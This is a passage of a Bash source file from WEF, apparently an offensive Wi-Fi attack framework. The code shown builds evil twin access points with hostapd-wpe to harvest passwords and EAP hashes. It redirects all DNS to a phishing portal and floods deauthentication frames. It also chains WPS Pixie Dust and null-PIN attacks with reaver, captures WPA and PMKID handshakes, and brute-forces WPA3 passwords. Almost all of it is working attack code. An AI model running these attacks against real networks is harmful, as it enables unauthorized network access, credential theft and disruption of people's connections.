  elif [ "${evil_option}" == "3" ] || [ "${evil_option}" == "4" ]; then
    # Find dinamically the path of this files as it may vary between different systems
    eap_user_file="$(find "/etc/hostapd-wpe/" -type f -name "hostapd-wpe.eap_user" 2>/dev/null)"
    ca_cert="$(find "/etc/hostapd-wpe/" -type f -name "ca.pem" 2>/dev/null)"
    server_cert="$(find "/etc/hostapd-wpe/" -type f -name "server.pem" 2>/dev/null)"
    private_key="$(find "/etc/hostapd-wpe/" -type f -name "server.key" 2>/dev/null)"
    dh_file="$(find "/etc/hostapd-wpe/" -type f -name "dh" 2>/dev/null)"

    echo "interface=${evil_twin_interface}
ssid=${essid}
channel=${channel}

eap_user_file=${eap_user_file}
ca_cert=${ca_cert}
server_cert=${server_cert}
private_key=${private_key}
private_key_passwd=whatever
dh_file=${dh_file}

eap_server=1
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
ieee8021x=1
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP

logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

hw_mode=${hw_mode}
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0" >> "${cache_path}/hostapd.conf"
  fi

  # Launch hostapd
  if [ "${evil_option}" == "1" ] || [ "${evil_option}" == "2" ]; then
    if [ "${airmon_check_kill}" == "true" ]; then
      # No headless
      if [ "${karma}" == "y" ] || [ "${karma}" == "yes" ] || [ "${karma}" == "s" ] || [ "${karma}" == "si" ]; then
        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 90x25-10+10 -T "Hostapd" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe ${cache_path}/hostapd.conf -k" 2>/dev/null &
      else
        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 90x25-10+10  -T "Hostapd" -xrm 'XTerm*selectToClipboard: true' -e "hostapd ${cache_path}/hostapd.conf" 2>/dev/null &
      fi
    else
      # Headless
      if [ "${karma}" == "y" ] || [ "${karma}" == "yes" ] || [ "${karma}" == "s" ] || [ "${karma}" == "si" ]; then
        hostapd-wpe "${cache_path}/hostapd.conf" -k &>/dev/null &
      else
        hostapd "${cache_path}/hostapd.conf" &>/dev/null &
      fi
    fi
  elif [ "${evil_option}" == "3" ] || [ "${evil_option}" == "4" ]; then
    if [ "${airmon_check_kill}" == "true" ]; then
      if [ "$lang" == "en" ]; then
        info_ln "The hostapd window will only show the obtained passwords and hashes"
      else
        info_ln "La ventana de hostapd solo mostrará las contraseñas o hashes obtenidos"
      fi

      # No headless
      if [ "${karma}" == "y" ] || [ "${karma}" == "yes" ] || [ "${karma}" == "s" ] || [ "${karma}" == "si" ]; then
        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 90x25-10+10 -T "Hostapd-wpe" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe ${cache_path}/hostapd.conf -s -k" 2>/dev/null &
      else
        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 90x25-10+10 -T "Hostapd-wpe" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe ${cache_path}/hostapd.conf -s" 2>/dev/null &
      fi
    else
      # Headless
      if [ "${karma}" == "y" ] || [ "${karma}" == "yes" ] || [ "${karma}" == "s" ] || [ "${karma}" == "si" ]; then
        hostapd-wpe "${cache_path}/hostapd.conf" -s -k &>/dev/null &
      else
        hostapd-wpe "${cache_path}/hostapd.conf" -s &>/dev/null &
      fi
    fi
  fi
  hostapd_PID=$!

  sleep 8

  if [ "${evil_option}" == "1" ] || [ "${evil_option}" == "2" ]; then
    # Creating dnsmasq configuration file
    echo "
interface=${evil_twin_interface}
dhcp-range=10.0.221.2,10.0.221.30,255.255.255.0,12h
dhcp-option=3,10.0.221.1
dhcp-option=6,10.0.221.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.221.1
address=/#/10.0.221.1" >> "${cache_path}/dnsmasq.conf"

    ip address add 10.0.221.1/24 dev ${evil_twin_interface}
    #ifconfig ${evil_twin_interface} 10.0.221.1 netmask 255.255.255.0
    route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1

    # Dnsmasq
    if [ "${airmon_check_kill}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 90x25-10+370 -T "Dnsmasq" -xrm 'XTerm*selectToClipboard: true' -e "dnsmasq -C ${cache_path}/dnsmasq.conf -d" 2>/dev/null &
    else
      dnsmasq -C "${cache_path}/dnsmasq.conf" -d > /dev/null 2>&1 &
    fi
    dnsmasq_PID=$!

    sleep 6
  fi

  # Deauth
  if [ "${evil_option}" == "2" ] || [ "${evil_option}" == "4" ]; then
    iw dev "mon${monitor_interface}" set channel ${channel} 2>/dev/null
    sleep 0.1

    if [ "${airmon_check_kill}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 90x25-10+730 -T "Deauth" -xrm 'XTerm*selectToClipboard: true' -e "aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_bssid} mon${evil_twin_interface}" 2>/dev/null &
    else
      aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a "${ap_bssid}" "mon${evil_twin_interface}" > /dev/null 2>&1 &
    fi
    evil_twin_deauth_PID=$!

    sleep 6
  fi

  if [ "${evil_option}" == "1" ] || [ "${evil_option}" == "2" ]; then
    # Start web server (Lighttpd)
    if [ "${airmon_check_kill}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 90x25-565+10 -T "Lighttpd" -xrm 'XTerm*selectToClipboard: true' -e "lighttpd -D -f ${cache_path}/lighttpd.conf" 2>/dev/null &
    else
      lighttpd -f "${cache_path}/lighttpd.conf" > /dev/null 2>&1 &
    fi
    lighttpd_PID=$!

    sleep 6

    export essid

    # Export function
    export -f check_success_evil_twin
    if [ "${airmon_check_kill}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 90x25-565+370 -T "Evil Twin" -xrm 'XTerm*selectToClipboard: true' -e "bash -c check_success_evil_twin" 2>/dev/null &
      evil_twin_PID=$!
    fi

    if [ "$lang" == "en" ]; then
      if [ "${check_passwords}" == "y" ] || [ "${check_passwords}" == "yes" ] || [ "${check_passwords}" == "s" ] || [ "${check_passwords}" == "si" ]; then
        success_ln "Evil Twin attack successfully deployed, the attack will stop immediately whenever the password is found"
      else
        success_ln "Evil Twin attack successfully deployed"
      fi

      if [ "${template_type}" == "built-in" ] || [ "${template_type}" == "builtin" ] || [ "${template_type}" == "predefinidas" ] || [ "${template_type}" == "default" ] || [ ! "${template_type}" ]; then
        check_password_evil_twin & # This will notify the user if the correct password is captured
        info "Gathered password attempts will be stored in ${evil_twin_path}/evil_twin_attempts.txt"
      else
        info "As you are using a custom template, make sure to check the obtained data by your own"
      fi
      
      press_enter "Press [Enter] to continue and finish the attack "
    else
      if [ "${check_passwords}" == "y" ] || [ "${check_passwords}" == "yes" ] || [ "${check_passwords}" == "s" ] || [ "${check_passwords}" == "si" ]; then
        success_ln "Ataque Evil Twin desplegado correctamente, cuando se introduzca la contraseña correcta se detendrá el ataque automaticamente"
      else
        success_ln "Ataque Evil Twin desplegado correctamente"
      fi

      if [ "${template_type}" == "built-in" ] || [ "${template_type}" == "builtin" ] || [ "${template_type}" == "predefinidas" ] || [ "${template_type}" == "default" ] || [ ! "${template_type}" ]; then
        # This will notify the user if the correct password is captured
        check_password_evil_twin &
        info "Las contraseñas recolectadas serán almacenadas en ${evil_twin_path}/evil_twin_attempts.txt"
      else
        info "Al estar usando una plantilla personalizada, asegurate de comprobar la información obtenida por ti mismo"
      fi

      press_enter "Presiona [Enter] para continuar y terminar el ataque "
    fi

    sleep 0.3

  elif [ "${evil_option}" == "3" ] || [ "${evil_option}" == "4" ]; then

    if [ "$lang" == "en" ]; then
      info_ln "Obtained passwords or hashes will be saved in ${cache_path}/hostapd-wpe.log"
      success "Evil Twin attack deployed successfully"
      press_enter "Press [Enter] to continue and finish the attack "
    else
      info_ln "Las contraseñas o hashes obtenidos se mostrarán en el output de hostapd"
      success "Ataque Evil Twin desplegado correctamente"
      press_enter "Presiona [Enter] para continuar y terminar el ataque "
    fi

    if [ -f "hostapd-wpe.log" ]; then
      # Move the hostapd-wpe.log file later because the data is written into the file when the process dies

      if [ "$lang" == "en" ]; then
        success_ln "Login attempts have been saved in ${cache_path}/hostapd-wpe.log"
      else
        success_ln "Los intentos de inicio de sesion se han guardado en ${cache_path}/hostapd-wpe.log"
      fi
    fi
  fi

  # The attack finishes here

  # Kill the launched processes and ask the user to return to the menu
  exit_evil_twin

  # Reconfigure network interface
  airmon-ng start "${managed_interface}" &>/dev/null
}

function auto_pwn_attack(){
  clear_screen

  # Initialize variables
  wps_enabled="false"
  attack_success="false"
  password_obtained="false"
  wpa_handshake_captured="false"
  pmkid_handshake_captured="false"

  remove_file "${cache_path}/reaver_output.txt"
  remove_file "${cache_path}/wacker_output.txt"

  if [ "$lang" == "en" ]; then
    type_of_attack="Auto PWN mode"
    info_ln "In this mode, all suitable attacks are performed to get the password or handshake of the target access point"
  else
    type_of_attack="Modo Auto PWN"
    info_ln "En este modo, se realizan todos los ataques necesarios para obtener la contraseña o el handshake del punto de acceso objetivo"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info
  export_dir

  # Parse airodump capture with wash in order to check if target AP has WPS enabled
  wps_field="$(wash -f "${cache_path}/airodump-01.cap" | grep -i "${ap_bssid}" | awk '{print $4}')"

  if [ "${wps_field}" == "1.0" ] || [ "${wps_field}" == "2.0" ]; then
    if [ "$lang" == "en" ]; then
      success_ln "WPS is enabled. Performing WPS attacks\n"
    else
      success_ln "WPS esta activado. Realizando ataques WPS\n"
    fi
    wps_enabled="true"
  else
    if [ "$lang" == "en" ]; then
      failed_ln "WPS is disabled. Skipping WPS attacks\n"
    else
      failed_ln "WPS esta desactivado. Saltando los ataques WPS\n"
    fi
    wps_enabled="false"
  fi; sleep 1

  if [ "${wps_enabled}" == "true" ]; then
    if [ "$lang" == "en" ]; then
      status "Launching Pixie Dust attack..."
    else
      status "Lanzando ataque Pixie Dust..."
    fi

    if [ "$verbose" == "false" ]; then
      if [ "$channel" -le 14 ]; then
        reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -v | tee "${cache_path}/reaver_output.txt" &
      else
        reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -v -5 | tee "${cache_path}/reaver_output.txt" &
      fi
    elif [ "$verbose" == "true" ]; then
      if [ "$channel" -le 14 ]; then
        reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -vv | tee "${cache_path}/reaver_output.txt" &
      else
        reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -vv -5 | tee "${cache_path}/reaver_output.txt" &
      fi
    fi

    reaver_PID=$!
    sleep "70s"
    kill_processes ${reaver_PID}
    sleep 2

    # Check if the WPA PSK was successfully retrieved
    if [ "$(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:")" ]; then
      success_ln "The WPA password of the access point was retrieved: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
      attack_success="true"
      password_obtained="true"
    else
      if [ "$lang" == "en" ]; then
        failed_ln "It was not possible to obtain the password\n"
      else
        failed_ln "No fue posible obtener la contraseña WPA\n"
      fi
    fi

    # Only perform attack if the WPA key has not been retrieved yet
    if [ "${attack_success}" != "true" ]; then
      if [ "$lang" == "en" ]; then
        status "Launching Null PIN attack..."
      else
        status "Lanzando ataque de PIN Nulo..."
      fi

      if [ "$channel" -le 14 ]; then
        reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -L -f -N -g 1 -d 2 -p '' -vv | tee "${cache_path}/reaver_output.txt" &
      else
        reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -L -f -N -g 1 -d 2 -p '' -vv -5 | tee "${cache_path}/reaver_output.txt" &
      fi

      reaver_PID=$!
      sleep "30s"
      kill_processes ${reaver_PID}
      sleep 1

      # Check again if the WPA PSK was successfully retrieved
      if [ "$(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:")" ]; then
        if [ "$lang" == "en" ]; then
          success_ln "The WPA password of the access point was retrieved: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
        else
          success_ln "La contraseña WPA del punto de acceso ha sido obtenida: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
        fi
        attack_success="true"
        password_obtained="true"
      else
        if [ "$lang" == "en" ]; then
          failed_ln "It was not possible to obtain the WPA password\n"
        else
          failed_ln "No fue posible obtener la contraseña WPA\n"
        fi
      fi

    fi
  fi

  if [ "${attack_success}" != "true" ]; then
    if [ "$lang" == "en" ]; then
      status "Launching deauthentication attack..."
    else
      status "Lanzando ataque de deautenticacion..."
    fi; sleep 1

    # Launch airodump-ng based on user's config
    launch_airodump
    sleep 1

    # Configure the interface on the same channel
    iw dev "${monitor_interface}" set channel ${channel} 2>/dev/null
    sleep 1

    if [ "$verbose" == "false" ]; then
      aireplay-ng -0 12 -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF "${monitor_interface}" &>/dev/null
    else
      echo
      aireplay-ng -0 12 -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF "${monitor_interface}" 2>/dev/null
    fi; sleep 1

    # Wait until the stations reconnect to the AP
    log_waiting_handshakes
    sleep 9
    kill_processes ${airodump_PID}

    # Check if at least 1 WPA handshake was captured
    if [ "$(check_wpa_handshake "${cache_path}/${cap_name}-01.cap")" == "true" ]; then
      if [ "$lang" == "en" ]; then
        success_ln "The WPA handshake was successfully obtained"
      else
        success_ln "El handshake WPA fue obtenido correctamente"
      fi

      move_network_capture
      attack_success="true"
      wpa_handshake_captured="true"
    else
      if [ "$lang" == "en" ]; then
        failed_ln "The WPA handshake was not captured"
      else
        failed_ln "No se pudo capturar el handshake WPA"
      fi
    fi

    if [ "${wpa_handshake_captured}" != "true" ]; then
      # Run PMKID attack
      if [ "$lang" == "en" ]; then
        status "Launching PMKID attack..."
      else
        status "Lanzando ataque PMKID..."
      fi; sleep 1

      # Disable monitor mode as hcxtools may break if interface is in monitor mode
      airmon-ng stop "${monitor_interface}" &>/dev/null
      pmkid_running="true"

      # Launch hcxdumptool
      hcxdumptool -i "${managed_interface}" -c ${pmkid_channel} -w "${cache_path}/${cap_name}.pcapng" | grep -v "bye-bye" &
      hcx_PID=$!
      
      sleep "70s"
      kill_processes ${hcx_PID}
      sleep 1
      remove_file "${cache_path}/all_pmkid_handshakes.txt"

      if [ "$lang" == "en" ]; then
        info_ln "Reconfiguring the network interface..."
      else
        info_ln "Reconfigurando la interfaz de red..."
      fi

      # Re-enable monitor mode (with airmon-ng)
      ip link set "${managed_interface}" down 2>/dev/null
      iw "${managed_interface}" set type managed 2>/dev/null
      ip link set "${managed_interface}" up 2>/dev/null

      airmon-ng start "${managed_interface}" &>/dev/null
      pmkid_running="false"

      if [ "$lang" == "en" ]; then
        info_ln "Extracting hashes from ${cache_path}/${cap_name}.pcapng"
      else
        info_ln "Extrayendo hashes de ${cache_path}/${cap_name}.pcapng"
      fi

      # Extract all the handshakes in hashcat crackeable format
      if [ "$verbose" == "false" ]; then
        hcxpcapngtool -o "${cache_path}/all_pmkid_handshakes.txt" "${cache_path}/${cap_name}.pcapng" &>/dev/null
      elif [ "$verbose" == "true" ]; then
        echo
        hcxpcapngtool -o "${cache_path}/all_pmkid_handshakes.txt" "${cache_path}/${cap_name}.pcapng"
      fi; sleep 1.5

      # Check if at least one handshake was captured by checking if the file exists
      if [ -f "${cache_path}/all_pmkid_handshakes.txt" ]; then
        if [ "$lang" == "en" ]; then
          info "Filtering captured PMKID handshakes..."
        else
          info "Filtrando los handshakes PMKID capturados..."
        fi

        create_dir

        # Filter the handshakes for the targeted access point
        if [ "$verbose" == "false" ]; then
          hcxhashtool -o "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt" --mac-ap=${ap_bssid} -i "${cache_path}/all_pmkid_handshakes.txt" &>/dev/null
        elif [ "$verbose" == "true" ]; then
          hcxhashtool -o "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt" --mac-ap=${ap_bssid} -i "${cache_path}/all_pmkid_handshakes.txt"
        fi; sleep 0.5

        # Let the user know if the PMKID handshake was captured or not
        if [ -f "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt" ]; then
          if [ "$lang" == "en" ]; then
            success "The PMKID handshake was successfully captured"
          else
            success "El handshake PMKID ha sido capturado exitosamente"
          fi

          attack_success="true"
          pmkid_handshake_captured="true"
        else
          if [ "$lang" == "en" ]; then
            failed "The PMKID handshake was not captured"
          else
            failed "No se pudo capturar el handshake PMKID"
          fi
        fi
      fi
    fi
  fi

  if [ "$lang" == "en" ]; then
    status_ln "Summary:"
  else
    status_ln "Resumen:"
  fi

  # Check the success of the attacks
  if [ "${attack_success}" == "true" ]; then
    if [ "${password_obtained}" == "true" ]; then
      if [ "$lang" == "en" ]; then
        success "The WPA password was successfully obtained: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
      else
        success "La contraseña WPA fue obtenida correctamente: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
      fi
    else
      if [ "${wpa_handshake_captured}" == "true" ]; then
        if [ "$lang" == "en" ]; then
          success "The WPA handshake was successfully captured: ${output_path}/${ap_dir}/${cap_name}.cap"
        else
          success "El handshake WPA fue capturado correctamente: ${output_path}/${ap_dir}/${cap_name}.cap"
        fi
      else
        if [ "$lang" == "en" ]; then
          failed "The WPA handshake was not captured"
        else
          failed "No se pudo capturar el handshake WPA"
        fi
      fi

      if [ "${pmkid_handshake_captured}" ]; then
        if [ "$lang" == "en" ]; then
          success "The PMKID handshake was successfully captured: ${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt"
        else
          success "El handshake PMKID fue capturado correctamente: ${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt"
        fi
      else
        if [ "$lang" == "en" ]; then
          failed "The PMKID handshake was not captured"
        else
          failed "No se pudo capturar el handshake PMKID"
        fi
      fi
    fi
  else
    if [ "$lang" == "en" ]; then
      failed "Neither the password nor the handshake were obtained"
    else
      failed "No se pudo obtener ni la contraseña ni el handshake"
    fi
  fi

  create_informative_report
  log_completed

  c_h="true"
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    if [ "${wpa_handshake_captured}" == "true" ]; then
      crack_handshake "${output_path}/${ap_dir}/${cap_name}.cap"
    elif [ "${pmkid_handshake_captured}" == "true" ]; then
      crack_pmkid_handshake "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt"
    fi
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

function wpa3_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="WPA3 Dictionary Attack"
    info_ln "This attack consists of performing a dictionary-based brute-force attack to discover the AP's password"
  else
    type_of_attack="Ataque WPA3 con diccionario"
    info_ln "Este ataque consiste en realizar un ataque de fuerza bruta basado en diccionario para descubrir la contraseña del AP"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  channel_freq="$(channel_to_freq "${channel}")"

  create_dir

  ask_wordlist
  if [ "$dic_option" == "back" ]; then
    return
  fi

  if [ "$lang" == "en" ]; then
    info_ln "Configuring the network interface to properly brute-force the WPA3 password...\n"
  else
    info_ln "Configurando la interfaz de red para poder hacer fuerza bruta correctamente sobre la contraseña WPA3...\n"
  fi

  airmon-ng stop "${monitor_interface}" &>/dev/null

  sleep 1

  ip link set ${managed_interface} up

  sleep 0.2

  # Kill wpa_supplicant and NetworkManager because they intefere with wacker
  killall wpa_supplicant NetworkManager 2>/dev/null

  sleep 2

  if [ "$lang" == "en" ]; then
    status "Launching WPA3 brute-force attack, press Ctrl+C to stop it...\n"
  else
    status "Iniciando ataque de fuerza brute de WPA3, presiona Ctrl+C para pararlo...\n"
  fi

  sleep 1

  script -q -c "python3 \"${wacker_path}/wacker.py\" --wordlist \"${wordlist_to_use}\" --ssid \"${essid}\" --bssid \"${ap_bssid}\" --freq \"${channel_freq}\" --interface \"${managed_interface}\"" "${cache_path}/wacker_output.txt"
  
  sleep 0.5

  if [ "$lang" == "en" ]; then
    info_ln "Configuring the network interface..."
  else
    info_ln "Reconfigurando la interfaz de red..."
  fi
  airmon-ng start "${managed_interface}" &>/dev/null

  create_informative_report
  log_completed
  ask_to_exit
}




#
# Main workflow starts here
#

# Check if the script is being executed on Windows
if [[ "$(uname -s)" =~ MINGW|MSYS|CYGWIN ]]; then
  echo -e "It seems that you are executing this script on Windows, but it is not supported"
  echo -e "This script only works on Linux"
  exit 1
fi

if [ -z "$BASH_VERSION" ]; then
  if [ "$lang" == "en" ]; then
    echo -e "The script is not being executed with Bash, make sure to be using Bash"
  else
    echo -e "El script no se está ejecutando con Bash, asegurate de estar usando Bash"
  fi
  exit 1
fi

# Main program function
if [ "$(id -u)" != "0" ]; then
  banner2
  if [ "$lang" == "en" ]; then
    echo -e "${blueC}\nExecute the program as root${endC}"
  else
    echo -e "${blueC}\nEjecuta el programa como root${endC}"
  fi
  
  exit 1
fi

while getopts ":i:" arg; do
  case ${arg} in
    i) managed_interface=$OPTARG;
  esac
done

for parameter in ${parameters[@]}; do

  if [ "${parameter}" == "--version" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${grayC}wef v${program_version} for linux (https://github.com/D3Ext/WEF)${endC}"
      echo -e "${grayC}Created by D3Ext <d3ext@proton.me>${endC}"
    else
      echo -e "${grayC}wef v${program_version} para linux (https://github.com/D3Ext/WEF)${endC}"
      echo -e "${grayC}Creado por D3Ext <d3ext@proton.me>${endC}"
    fi
    exit 0
  fi

  if [ "$parameter" == "-h" ] || [ "$parameter" == "--help" ]; then
    help_panel
    exit 0
  fi
done

if [ ! -d "${wef_path}/" ]; then
  run_setup
  exit 0
fi

# Create temporal folder were non-necessary files will be stored
check_and_create "${cache_path}"

if [ ! -f "${config_file}" ]; then
  echo "# This is default configuration file
# This file must be saved as ${config_file}

# Default lenguage to use. Values: en, es
lang=en

# Enable/disable verbose (recommended to be enabled)
verbose=true" > "${config_file}"
fi

if [ "$1" == "--interface" ]; then
  managed_interface="$2"
elif [ "$2" == "--interface" ]; then
  managed_interface="$3"
elif [ "$3" == "--interface" ]; then
  managed_interface="$4"
elif [ "$4" == "--interface" ]; then
  managed_interface="$5"
fi

monitor_interface="${managed_interface}"

# Check if network adapter was given, otherwise show help panel and exit
if [ ! "$managed_interface" ]; then
  help_panel
  exit 0
fi

if [ ! -d "/sys/class/net/${managed_interface}" ]; then
  banner2
  if [ "$lang" == "en" ]; then
    echo -e "${redC}\nInterface not found${endC}"
  else
    echo -e "${redC}\nInterfaz no disponible${endC}"
  fi

  exit 1
fi

if [ "$(check_interface_mode)" == "monitor" ]; then
  if [ "$lang" == "en" ]; then
    warning_ln "Please, disable monitor mode in order to use this tool"
  else
    warning_ln "Por favor, desactiva el modo monitor para poder usar esta herramienta"
  fi

  exit 1
fi

if [ "$lang" == "en" ]; then
  echo -e "${grayC}WEF v${program_version}${endC}"
  echo -e "${grayC}Use this tool only under your own responsibility${endC}"
  progress_bar 2 0.6 "${grayC}Launching framework${end}"
else
  echo -e "${grayC}WEF v${program_version}${endC}"
  echo -e "${grayC}Use esta herramienta unicamente bajo su responsabilidad${endC}"
  progress_bar 2 0.6 "${grayC}Iniciando framework${endC}"
fi

# Get network adapter chipset
if [ "$(command -v airmon-ng)" ]; then
  delim=$(airmon-ng | grep "${managed_interface}" | awk '{print $3}')
  chipset="$(airmon-ng | grep "${managed_interface}" | grep -oP "(?<=${delim}).*" | sed 's/^[[:blank:]]*//')"

  if [ "$(echo "${chipset}" | grep "unknown")" ]; then
    chipset="(unknown)"
  fi
fi

echo

# Parse configuration file
parse_config

# Find and parse wordlists
parse_wordlists

# Check required tools
check_dependencies

# Parse interesting info
network_adapter="$(lsusb | grep -i -E "wifi|wireless|realtek|atheros|broadcom" | awk -F ': ' '{print $2}' | cut -f 1,2 --complement -d " ")"
operative_system="$(source /etc/os-release && echo "$NAME $VERSION")"

# Check if given interface supports monitor mode
if [ "$(command -v iw)" ] && [ ! "$(iw list | grep "Supported interface modes" -A 8 | grep -i "monitor")" ]; then
  echo
  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Provided interface does not seem to support monitor mode. Do you want to continue? (yes/no): " check_mon
    else
      input_no_line "La interfaz proporcionada no parece soportar modo monitor. ¿Quieres continuar? (si/no): " check_mon
    fi

    if [ "$check_mon" == "y" ] || [ "$check_mon" == "yes" ] || [ "$check_mon" == "s" ] || [ "$check_mon" == "si" ]; then
      break
    elif [ "$check_mon" == "n" ] || [ "$check_mon" == "no" ]; then
      exit 1
    else
      log_invalid_option
    fi
  done
fi

# Enable monitor mode based on config file
if [ "${auto_enable_monitor}" == "true" ]; then
  enable_mon
else
  sleep 1
fi

# Randomize MAC based on config file
if [ "$(check_interface_mode)" == "monitor" ] && [ "${auto_random_mac}" == "true" ]; then
  ip link set ${monitor_interface} down 2>/dev/null

  if [ "$lang" == "en" ]; then
    info "Randomizing MAC address..."
  else
    info "Randomizando la dirección MAC..."
  fi; sleep 0.5

  macchanger -a "${monitor_interface}" &>/dev/null

  if [ "$lang" == "en" ]; then
    success "MAC address has been randomized"
  else
    success "La dirección MAC ha sido randomizada"
  fi
fi

sleep 1

if [ "${auto_enable_monitor}" == "true" ]; then
  ip link set "${monitor_interface}" up 2>/dev/null
else
  ip link set "${managed_interface}" up 2>/dev/null
fi

# Define band based on config file
if [ "${frequency_band}" == "auto" ]; then
  out="$(iw list | grep -A 10 'Frequencies:')"
  if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then
    band="g"
  elif [ "$(echo ${out} | grep "\[6\]")" ] && [ "$(echo ${out} | grep "\[36\]")" ]; then
    band="ag"
  fi

elif [ "${frequency_band}" == "2.4" ] || [ "${frequency_band}" == "2" ]; then
  band="g"
elif [ "${frequency_band}" == "5" ]; then
  band="a"
fi

# Check if using bspwm
if [ "$(pgrep -x "bspwm")" ]; then
  # Add a rule to launch xterm in floating state (useful when scanning nearby APs)
  bspc rule -a XTerm state=floating focus=off
fi

# Define parameter to clear or not the screen
clear_p=1

function main_menu(){
  while true; do
    # Set custom handler for the Ctrl+C keyboard interrupt
    trap ctrl_c INT
    input=1

    # Update current directory
    dir=$(pwd)

    # Get info about the MAC address on every single loop so that it is always updated
    if [ -d "/sys/class/net/${monitor_interface}" ]; then
      macchanger_output="$(macchanger -s ${monitor_interface})"
    elif [ -d "/sys/class/net/${managed_interface}" ]; then
      macchanger_output="$(macchanger -s ${managed_interface})"
    fi

    # Get current and permanent vendors from "macchanger" output
    current_vendor="($(echo -e "${macchanger_output}" | grep "Current" | awk '{print $2}' FS="(")"
    permanent_vendor="($(echo -e "${macchanger_output}" | grep "Permanent" | awk '{print $2}' FS="(")"
    
    # Get current and permanent MAC addresses
    current_mac="$(echo -e "${macchanger_output}" | grep "Current" | awk '{print $3}' | tr '[:lower:]' '[:upper:]')"
    permanent_mac="$(echo -e "${macchanger_output}" | grep "Permanent" | awk '{print $3}' | tr '[:lower:]' '[:upper:]')"

    # Use a counter to not to print the banner and the panel all the times
    if [ $clear_p == 1 ]; then
      clear_screen
      clear_p=0

      banner
      echo
      print_interface_name
      print_interface_mode
      print_mac_address

      attacks_panel
      if [ "$lang" == "en" ]; then
        echo -e "\n${blueC}Type ${yC}help${blueC} to display more functions and commands${endC}"
      else
        echo -e "\n${blueC}Escribe ${yC}help${blueC} para ver mas funciones y comandos${endC}"
      fi
    fi

    reset_info

    wef_prompt
    input=0

    # Check if the selected option/command needs monitor mode to warn the user
    if [ "$(check_if_monitor_is_needed "${option}")" == "yes" ] && [ "$(check_interface_mode)" != "monitor" ]; then
      log_monitor_is_disabled
      continue
    fi

    if [ "$option" == "1" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ]; then
      deauthentication_attack; clear_p=1

    elif [ "$option" == "2" ] || [ "$option" == "wids" ] || [ "$option" == "confusion" ]; then
      wids_confusion_attack; clear_p=1

    elif [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ]; then
      authentication_attack; clear_p=1

    elif [ "$option" == "4" ] || [ "$option" == "beacon" ] || [ "$option" == "beacon flood" ]; then
      beacon_flood_attack; clear_p=1

    elif [ "$option" == "5" ] || [ "$option" == "michael" ] || [ "$option" == "tkip" ]; then
      tkip_attack; clear_p=1

    elif [ "$option" == "6" ] || [ "$option" == "pixiedust" ] || [ "$option" == "pixie" ]; then
      pixie_dust_attack; clear_p=1

    elif [ "$option" == "7" ] || [ "$option" == "brute" ]; then
      pin_bruteforce_attack; clear_p=1

    elif [ "$option" == "8" ] || [ "$option" == "null" ] || [ "$option" == "nullpin" ]; then
      null_pin_attack; clear_p=1

    elif [ "$option" == "9" ] || [ "$option" == "replay" ] || [ "$option" == "arp" ]; then
